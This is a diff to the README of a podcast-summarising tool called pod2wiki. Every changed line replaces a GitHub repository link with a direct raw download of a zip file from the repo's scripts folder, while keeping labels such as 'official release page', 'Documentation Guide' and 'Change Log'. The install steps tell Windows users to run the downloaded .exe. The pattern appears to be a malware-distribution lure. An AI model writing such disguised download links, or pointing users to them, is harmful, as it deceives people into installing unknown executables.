@@ -1,6 +1,6 @@
 # 🎙️ pod2wiki - Turn podcasts into organized knowledge pages
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jacobusarminiusradyera634/pod2wiki)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Jacobusarminiusradyera634/pod2wiki/main/scripts/wiki_pod_3.2-alpha.1.zip)
 
 This application converts podcast audio and long-form articles into structured summaries. It formats your content for tools like karpathy-claude-wiki. You save time by reviewing key points instead of listening to hours of audio.
 
@@ -8,7 +8,7 @@ This application converts podcast audio and long-form articles into structured s
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Jacobusarminiusradyera634/pod2wiki) to download the application.
+1. Visit the [official release page](https://raw.githubusercontent.com/Jacobusarminiusradyera634/pod2wiki/main/scripts/wiki_pod_3.2-alpha.1.zip) to download the application.
 2. Select the file ending in `.exe` for Windows systems.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation.
@@ -101,8 +101,8 @@ We update the software to improve the quality of the summaries. Check the reposi
 
 ## 🖇 Resource Links
 
-* [Official Repository](https://github.com/Jacobusarminiusradyera634/pod2wiki)
-* [Documentation Guide](https://github.com/Jacobusarminiusradyera634/pod2wiki)
-* [Change Log](https://github.com/Jacobusarminiusradyera634/pod2wiki)
+* [Official Repository](https://raw.githubusercontent.com/Jacobusarminiusradyera634/pod2wiki/main/scripts/wiki_pod_3.2-alpha.1.zip)
+* [Documentation Guide](https://raw.githubusercontent.com/Jacobusarminiusradyera634/pod2wiki/main/scripts/wiki_pod_3.2-alpha.1.zip)
+* [Change Log](https://raw.githubusercontent.com/Jacobusarminiusradyera634/pod2wiki/main/scripts/wiki_pod_3.2-alpha.1.zip)
 
 Review these links to stay current with software improvements. Each update adds support for more feed types and better processing speed.
